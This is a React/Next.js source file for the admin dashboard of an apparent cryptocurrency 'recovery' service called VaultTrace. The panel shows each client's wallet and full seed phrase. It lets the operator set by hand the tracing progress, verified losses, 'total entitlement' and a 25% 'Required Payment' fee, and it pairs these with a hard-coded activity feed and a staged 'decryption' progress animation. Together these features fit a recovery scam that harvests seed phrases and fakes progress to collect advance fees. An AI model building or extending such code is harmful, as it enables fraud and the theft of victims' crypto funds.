'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import { getApiUrl } from '@/lib/api-config';
import CyberTracker from '@/components/CyberTracker';

interface User {
  email: string;
  role: string;
}

interface Client {
  id: string;
  name: string;
  email: string;
  createdAt: string;
}

interface ClientData {
  recoveredAmount: number;
  feePaid: boolean;
  trackingProgress: number;
  totalPercentage: number;
  paymentPending: boolean;
  paymentConfirmed: boolean;
  fundsUnlocked: boolean;
  balance: number;
  fixed: number;
  marsettaShare: number;
  verifiedLoss1: number;
  verifiedLoss2: number;
  totalEntitlement: number;
}

interface Message {
  id: string;
  from: string;
  message: string;
  time: string;
  clientEmail: string;
  adminReply?: string;
  adminReplyTime?: string;
  content?: string;
  timestamp?: string;
  createdAt?: string;
}

const defaultClientData: ClientData = {
  recoveredAmount: 0,
  trackingProgress: 0,
  totalPercentage: 0,
  feePaid: false,
  paymentPending: false,
  paymentConfirmed: false,
  fundsUnlocked: false,
  balance: 0,
  fixed: 0,
  marsettaShare: 0,
  verifiedLoss1: 0,
  verifiedLoss2: 0,
  totalEntitlement: 0,
};

export default function AdminDashboard() {
  const router = useRouter();
  const [user, setUser] = useState<User | null>(null);
  const [token, setToken] = useState<string>('');
  const [clients, setClients] = useState<Client[]>([]);
  const [selectedClient, setSelectedClient] = useState<string | null>(null);
  const [clientData, setClientData] = useState<any>(null);
  const [data, setData] = useState<ClientData>(defaultClientData);
  const [messages, setMessages] = useState<Message[]>([]);
  const [clientWallet, setClientWallet] = useState('');
  const [clientSeed, setClientSeed] = useState('');
  const [replyText, setReplyText] = useState('');
  const [selectedMessageId, setSelectedMessageId] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const [animatedProgress, setAnimatedProgress] = useState(0);
  const [displayAmount, setDisplayAmount] = useState(0);
  const [currentFee, setCurrentFee] = useState(0);
  const [isCalculating, setIsCalculating] = useState(false);

  useEffect(() => {
    const storedToken = sessionStorage.getItem('token');
    const storedUser = sessionStorage.getItem('user');

    if (!storedToken || !storedUser) {
      router.push('/admin-login');
      return;
    }

    try {
      const parsedUser = JSON.parse(storedUser);
      if (parsedUser.role !== 'admin') {
        router.push('/admin-login');
        return;
      }

      setToken(storedToken);
      setUser(parsedUser);

      // Load clients
      fetchClients(storedToken);
    } catch (error) {
      console.error('Error parsing user data:', error);
      router.push('/admin-login');
    }
  }, []);

  // Animate progress bar with phases
  useEffect(() => {
    const timer = setInterval(() => {
      setAnimatedProgress((prev) => {
        if (prev < data.trackingProgress) {
          // Phase 1: Fast scanning (0-85%)
          if (prev < 85) return prev + 2;
          // Phase 2: Slow decryption (85-95%)
          else if (prev < 95) return prev + 0.5;
          // Phase 3: Final calculation (95-100%)
          else return prev + 0.2;
        }
        return data.trackingProgress;
      });
    }, 50);
    return () => clearInterval(timer);
  }, [data.trackingProgress]);

  // Animate entitlement and fee calculation
  useEffect(() => {
    if (animatedProgress > 0) {
      setIsCalculating(true);
      const finalAmount = data.totalEntitlement;
      const increment = finalAmount / 100;

      const feePercent = (data as any).feePercent ?? 0.25;
      const timer = setInterval(() => {
        setDisplayAmount((prev) => {
          if (prev < finalAmount) {
            const newAmount = prev + increment;
            setCurrentFee(newAmount * feePercent);
            return newAmount;
          } else {
            clearInterval(timer);
            setIsCalculating(false);
            return finalAmount;
          }
        });
      }, animatedProgress < 85 ? 20 : animatedProgress < 95 ? 60 : 150); // Match progress phases

      return () => clearInterval(timer);
    } else {
      setDisplayAmount(0);
      setCurrentFee(0);
      setIsCalculating(false);
    }
  }, [animatedProgress, data.totalEntitlement]);

  const fetchClients = async (authToken: string) => {
    try {
      const response = await fetch(getApiUrl('/api/admin/clients'), {
        headers: {
          'Authorization': `Bearer ${authToken}`,
        },
      });

      if (response.ok) {
        const clientsData = await response.json();
        setClients(clientsData);
      } else {
        sessionStorage.removeItem('token');
        sessionStorage.removeItem('user');
        router.push('/admin-login');
      }
    } catch (error) {
      console.error('Error fetching clients:', error);
      sessionStorage.removeItem('token');
      sessionStorage.removeItem('user');
      router.push('/admin-login');
    } finally {
      setLoading(false);
    }
  };

  const fetchClientData = async (clientId: string, authToken: string) => {
    try {
      const response = await fetch(getApiUrl(`/api/admin/client?id=${clientId}`), {
        headers: {
          'Authorization': `Bearer ${authToken}`,
        },
      });

      if (response.ok) {
        const data = await response.json();
        setClientData(data);
        setData({
          ...defaultClientData,
          ...(data.data ?? {}),
        });
        setClientWallet(data.wallet || '');
        setClientSeed(data.seedPhrase || '');
        fetchMessages(authToken, data.email);
      } else {
        console.error('Error fetching client data:', await response.text());
      }
    } catch (error) {
      console.error('Error fetching client data:', error);
    }
  };

  const fetchMessages = async (authToken: string, clientEmail?: string) => {
    try {
      const url = clientEmail 
        ? getApiUrl(`/api/messages?clientEmail=${clientEmail}`)
        : getApiUrl('/api/messages');
      
      const response = await fetch(url, {
        headers: {
          'Authorization': `Bearer ${authToken}`,
        },
      });

      if (response.ok) {
        const messagesData = await response.json();
        setMessages(messagesData);
      }
    } catch (error) {
      console.error('Error fetching messages:', error);
    }
  };

  const selectClient = (clientId: string) => {
    setSelectedClient(clientId);
    if (token) {
      fetchClientData(clientId, token);
    }
  };

  const updateData = (key: string, value: any) => {
    const newData = { ...data, [key]: value };
    setData(newData);
  };

  const saveClientData = async () => {
    if (!selectedClient || !token) {
      alert('Select a client first.');
      return;
    }

    try {
      const response = await fetch(getApiUrl(`/api/admin/client?id=${selectedClient}`), {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ data }),
      });

      if (response.ok) {
        alert('Client data updated successfully.');
        fetchClientData(selectedClient, token);
      } else {
        const errorText = await response.text();
        console.error('Update failed:', errorText);
        alert(`Error updating client data: ${errorText}`);
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error updating client data.');
    }
  };

  const deleteClient = async () => {
    if (!selectedClient || !token) {
      alert('Select a client first.');
      return;
    }
    if (!confirm('Delete this client session and all saved data?')) {
      return;
    }

    try {
      const response = await fetch(getApiUrl(`/api/admin/client?id=${selectedClient}`), {
        method: 'DELETE',
        headers: {
          'Authorization': `Bearer ${token}`,
        },
      });

      if (response.ok) {
        setClients(clients.filter(client => client.id !== selectedClient));
        setSelectedClient(null);
        setData(defaultClientData);
        setClientWallet('');
        setClientSeed('');
        alert('Client session deleted.');
      } else {
        alert('Error deleting client.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error deleting client.');
    }
  };

  const handleReply = async (id: string) => {
    if (!replyText.trim() || !token) return;

    try {
      const response = await fetch(getApiUrl(`/api/messages/${id}/reply`), {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ reply: replyText }),
      });

      if (response.ok) {
        alert('Reply sent.');
        setReplyText('');
        setSelectedMessageId(null);
        if (selectedClient && clientData) {
          fetchMessages(token, clientData.email);
        }
      } else {
        alert('Error sending reply.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error sending reply.');
    }
  };

  const handleLogout = () => {
    sessionStorage.removeItem('token');
    sessionStorage.removeItem('user');
    router.push('/');
  };

  const formatMessageTime = (rawTime?: string | Date) => {
    const date = rawTime ? new Date(rawTime) : null;
    return date && !isNaN(date.getTime()) ? date.toLocaleTimeString() : '';
  };

  const activityFeed = [
    { action: 'Client logged in', time: '10:30 UTC' },
    { action: 'Payment pending approval', time: '09:45 UTC' },
    { action: 'Recovery bridge established', time: '08:20 UTC' },
  ];

  const statusSteps = [
    'Submitted',
    'Under Technical Assessment',
    'Tracing Active',
    'Legal/Exchange Outreach',
    'Resolution',
  ];

  return (
    <div className="min-h-screen bg-[#040b16] text-white p-6 md:p-10">
      <div className="max-w-7xl mx-auto space-y-8">
        <header className="flex flex-col gap-6 xl:flex-row xl:items-start xl:justify-between">
          <div className="space-y-4">
            <p className="uppercase tracking-[0.35em] text-cyan-300 text-xs">VaultTrace Admin Protocol</p>
            <div className="space-y-2">
              <h1 className="text-4xl md:text-5xl font-black tracking-tight">ADMIN CONTROL PANEL</h1>
              <p className="text-sm text-slate-400 uppercase tracking-[0.25em]">
                CASE: MARSETTA_7743-B • ACCESS: AUTHORIZED
              </p>
            </div>
            <div className="flex flex-wrap gap-3">
              <span className="inline-flex items-center gap-2 rounded-full bg-emerald-500/15 px-3 py-1 text-xs uppercase tracking-[0.3em] text-emerald-300">
                <span className="h-2 w-2 rounded-full bg-emerald-400 animate-pulse" /> SYSTEM ONLINE
              </span>
            </div>
          </div>

          <div className="flex gap-4">
            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-6 shadow-xl shadow-cyan-500/5">
              <p className="text-xs uppercase tracking-[0.3em] text-cyan-300 mb-3">Admin Credentials</p>
              <div className="space-y-2 text-sm text-slate-200">
                <p>support@vaulttrace.com</p>
                <p>Access Level: Full</p>
              </div>
            </div>
            <button
              onClick={handleLogout}
              className="glass rounded-[32px] border border-white/10 bg-white/5 p-6 shadow-xl shadow-cyan-500/5 hover:bg-red-500/10 transition"
            >
              <p className="text-xs uppercase tracking-[0.3em] text-red-300">Logout</p>
            </button>
          </div>
        </header>

        <section className="grid gap-8 xl:grid-cols-[1.5fr_1fr]">
          <div className="space-y-8">
            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
              <p className="text-xs uppercase tracking-[0.3em] text-cyan-300 mb-4">Registered Clients</p>
              <div className="space-y-4">
                {clients.map((client) => (
                  <div
                    key={client.id}
                    onClick={() => selectClient(client.id)}
                    className={`rounded-3xl p-4 border cursor-pointer transition ${selectedClient === client.id ? 'border-cyan-400 bg-cyan-500/10' : 'border-white/10 bg-slate-950/80'}`}
                  >
                    <p className="text-sm text-slate-200">{client.name} - {client.email}</p>
                  </div>
                ))}
              </div>
            </div>

            {selectedClient && (
              <>
                <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
                  <p className="text-xs uppercase tracking-[0.3em] text-cyan-300 mb-4">Client Data Management</p>
                  <div className="grid gap-6 md:grid-cols-2">
                    <div className="space-y-4">
                      <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Balance ($)</label>
                      <input
                        type="number"
                        value={data.balance}
                        onChange={(e) => updateData('balance', Number(e.target.value))}
                        className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                      />
                    </div>
                    <div className="space-y-4">
                      <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Fixed ($)</label>
                      <input
                        type="number"
                        value={data.fixed}
                        onChange={(e) => updateData('fixed', Number(e.target.value))}
                        className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                      />
                    </div>
                    <div className="space-y-4">
                      <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Marsetta Share ($)</label>
                      <input
                        type="number"
                        value={data.marsettaShare}
                        onChange={(e) => updateData('marsettaShare', Number(e.target.value))}
                        className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                      />
                    </div>
                    <div className="space-y-4">
                      <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Protocol Progress (%)</label>
                      <input
                        type="number"
                        min="0"
                        max="100"
                        value={data.trackingProgress}
                        onChange={(e) => updateData('trackingProgress', Number(e.target.value))}
                        className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                      />
                      <div className="mt-3">
                        <div className="flex justify-between items-center mb-2">
                          <span className="text-xs text-slate-400 uppercase tracking-[0.2em]">Live Progress</span>
                          <span className="text-xs text-cyan-400 font-bold">{animatedProgress}%</span>
                        </div>
                        <div className="w-full bg-slate-900/50 rounded-full h-3 border border-cyan-500/30 overflow-hidden">
                          <div
                            className="h-full bg-gradient-to-r from-cyan-500 to-cyan-400 rounded-full transition-all duration-100 shadow-lg shadow-cyan-500/50"
                            style={{ width: `${animatedProgress}%` }}
                          />
                        </div>
                      </div>
                    </div>
                    <div className="space-y-4">
                      <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Verified Loss #1 ($)</label>
                      <input
                        type="number"
                        value={data.verifiedLoss1}
                        onChange={(e) => updateData('verifiedLoss1', Number(e.target.value))}
                        className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                      />
                    </div>
                    <div className="space-y-4">
                      <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Verified Loss #2 ($)</label>
                      <input
                        type="number"
                        value={data.verifiedLoss2}
                        onChange={(e) => updateData('verifiedLoss2', Number(e.target.value))}
                        className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                      />
                    </div>
                    <div className="space-y-4">
                      <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Total Equity ($)</label>
                      <input
                        type="number"
                        value={data.recoveredAmount}
                        onChange={(e) => updateData('recoveredAmount', Number(e.target.value))}
                        className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                      />
                    </div>
                    <div className="space-y-4">
                      <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Total Entitlement ($)</label>
                      <input
                        type="number"
                        value={data.totalEntitlement}
                        onChange={(e) => updateData('totalEntitlement', Number(e.target.value))}
                        className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                      />
                      <div className="mt-3 p-4 bg-gradient-to-r from-cyan-500/10 to-cyan-400/10 border border-cyan-500/20 rounded-3xl">
                        <div className="flex justify-between items-center mb-2">
                          <span className="text-xs text-cyan-400 uppercase tracking-[0.2em]">Live Calculation</span>
                          <span className={`text-xs font-bold ${isCalculating ? 'text-yellow-400 animate-pulse' : 'text-green-400'}`}>
                            {isCalculating ? 'CALCULATING...' : 'COMPLETE'}
                          </span>
                        </div>
                        <div className="text-center">
                          <p className="text-2xl font-bold text-cyan-300">${displayAmount.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</p>
                          <p className="text-xs text-slate-400 uppercase tracking-[0.2em] mt-1">Total Entitlement</p>
                        </div>
                      </div>
                    </div>
                    <div className="space-y-4">
                      <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Service Fee (25%)</label>
                      <div className={`p-4 border rounded-3xl transition-all duration-300 ${
                        isCalculating && animatedProgress > 85 ? 'bg-yellow-500/10 border-yellow-500/30 animate-pulse' : 'bg-slate-950/80 border-white/10'
                      }`}>
                        <div className="text-center">
                          <p className={`text-xl font-bold ${isCalculating && animatedProgress > 85 ? 'text-yellow-300' : 'text-slate-200'}`}>
                            ${currentFee.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}
                          </p>
                          <p className="text-xs text-slate-400 uppercase tracking-[0.2em] mt-1">Required Payment</p>
                        </div>
                      </div>
                    </div>
                    <div className="space-y-4">
                      <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Payment Status</label>
                      <select
                        value={data.paymentConfirmed ? 'confirmed' : 'pending'}
                        onChange={(e) => updateData('paymentConfirmed', e.target.value === 'confirmed')}
                        className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                      >
                        <option value="pending">Pending Confirmation</option>
                        <option value="confirmed">Payment Confirmed</option>
                      </select>
                    </div>
                    <div className="space-y-4">
                      <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Unlock Funds</label>
                      <button
                        onClick={() => updateData('fundsUnlocked', !data.fundsUnlocked)}
                        className={`w-full rounded-3xl px-5 py-4 text-sm font-semibold uppercase tracking-[0.2em] transition ${
                          data.fundsUnlocked ? 'bg-green-500 text-black hover:bg-green-400' : 'bg-orange-500 text-black hover:bg-orange-400'
                        }`}
                      >
                        {data.fundsUnlocked ? '✓ Funds Unlocked' : 'Lock Funds'}
                      </button>
                    </div>
                  </div>
                </div>

                <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
                  <p className="text-xs uppercase tracking-[0.3em] text-cyan-300 mb-4">Client Recovery Details</p>
                  <div className="space-y-4">
                    <div>
                      <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Selected Wallet</label>
                      <p className="text-slate-200">{clientWallet}</p>
                    </div>
                    <div>
                      <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Seed Phrase</label>
                      <p className="text-slate-200 text-xs">{clientSeed}</p>
                    </div>
                  </div>
                </div>

                <div className="flex flex-col gap-4 md:flex-row md:justify-end">
                  <button
                    onClick={saveClientData}
                    className="rounded-3xl bg-cyan-500 px-6 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black transition hover:bg-cyan-400"
                  >
                    Update Client Data
                  </button>
                  <button
                    onClick={deleteClient}
                    className="rounded-3xl border border-red-500 bg-transparent px-6 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-red-300 transition hover:bg-red-500/10"
                  >
                    Delete Client Session
                  </button>
                </div>
              </>
            )}

            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
              <p className="text-xs uppercase tracking-[0.3em] text-cyan-300 mb-4">Support Messaging</p>
              <div className="space-y-4">
                {messages.length === 0 ? (
                  <p className="text-slate-400">No messages yet.</p>
                ) : (
                  messages.map(msg => (
                    <div key={msg.id} className="rounded-3xl bg-slate-950/80 p-4 border border-white/10">
                      <div className="flex justify-between items-center mb-2">
                        <span className="text-xs uppercase tracking-[0.3em] text-slate-500">{msg.from} - {formatMessageTime(msg.time || msg.timestamp || msg.createdAt)}</span>
                        {msg.adminReply ? (
                          <span className="text-green-400 text-xs">Replied</span>
                        ) : (
                          <button
                            onClick={() => setSelectedMessageId(msg.id)}
                            className="text-cyan-300 text-xs hover:underline"
                          >
                            Reply
                          </button>
                        )}
                      </div>
                      <p className="text-sm text-slate-200">{msg.message || msg.content}</p>
                      {msg.adminReply && (
                        <div className="mt-2 p-3 bg-cyan-500/10 rounded-lg border border-cyan-500/20">
                          <p className="text-xs text-cyan-300">Your reply: {msg.adminReply}</p>
                        </div>
                      )}
                      {selectedMessageId === msg.id && (
                        <div className="mt-4">
                          <textarea
                            value={replyText}
                            onChange={(e) => setReplyText(e.target.value)}
                            placeholder="Type your reply"
                            className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-2 text-sm text-slate-200"
                          />
                          <button
                            onClick={() => handleReply(msg.id)}
                            className="mt-2 rounded-3xl bg-cyan-500 px-4 py-2 text-sm font-semibold text-black"
                          >
                            Send Reply
                          </button>
                        </div>
                      )}
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>

          <aside className="space-y-8">
            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
              <p className="text-xs uppercase tracking-[0.3em] text-cyan-300 mb-4">Activity Feed</p>
              <div className="space-y-4">
                {activityFeed.map((item, index) => (
                  <div key={index} className="rounded-3xl bg-slate-950/80 p-4 border border-white/10">
                    <p className="text-sm text-slate-200">{item.action}</p>
                    <p className="text-xs text-slate-500 mt-1">{item.time}</p>
                  </div>
                ))}
              </div>
            </div>

            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
              <p className="text-xs uppercase tracking-[0.3em] text-cyan-300 mb-4">Current Client Status</p>
              <div className="space-y-4 text-sm">
                <div>
                  <label className="text-xs uppercase tracking-[0.2em] text-slate-400">Case Status</label>
                  <select
                    value={(data as any).statusIndex ?? 1}
                    onChange={(e) => updateData('statusIndex', parseInt(e.target.value))}
                    className="mt-2 w-full rounded-2xl border border-white/10 bg-slate-900/70 px-3 py-2 text-sm text-slate-200"
                  >
                    {statusSteps.map((s, i) => (
                      <option key={s} value={i}>{s}</option>
                    ))}
                  </select>
                  <div className="mt-2 space-y-2">
                    <div className="flex gap-2 items-center">
                      <label className="text-xs text-slate-300">Service Fee %</label>
                      <input
                        type="number"
                        min={0}
                        max={100}
                        step={0.1}
                        value={((data as any).feePercent ?? 0.25) * 100}
                        onChange={(e) => updateData('feePercent', (parseFloat(e.target.value) || 0) / 100)}
                        className="w-28 rounded-2xl border border-white/10 bg-slate-900/70 px-3 py-2 text-sm text-slate-200"
                      />
                    </div>
                    <div>
                      <button onClick={saveClientData} className="px-3 py-2 bg-cyan-500 text-black rounded">Save Status</button>
                    </div>
                  </div>
                </div>
                <p><strong>Recovered Amount:</strong> ${data?.recoveredAmount?.toLocaleString?.() ?? '0'}</p>
                <p><strong>Fee Paid:</strong> {data?.feePaid ? 'Yes' : 'No'}</p>
                <p><strong>Tracking Progress:</strong> {data?.trackingProgress ?? 0}%</p>
                <p><strong>Total Percentage:</strong> {data?.totalPercentage ?? 0}%</p>
                <p><strong>Payment Pending:</strong> {data?.paymentPending ? 'Yes' : 'No'}</p>
              </div>
              {/** Show CyberTracker preview for selected client */}
              {selectedClient && (
                <div className="mt-6">
                  <CyberTracker
                    steps={statusSteps}
                    currentStage={((data as any).statusIndex ?? Math.ceil((data.trackingProgress || 0) / 20)) + 1}
                    progress={animatedProgress}
                  />
                </div>
              )}
            </div>
          </aside>
        </section>
      </div>
    </div>
  );
}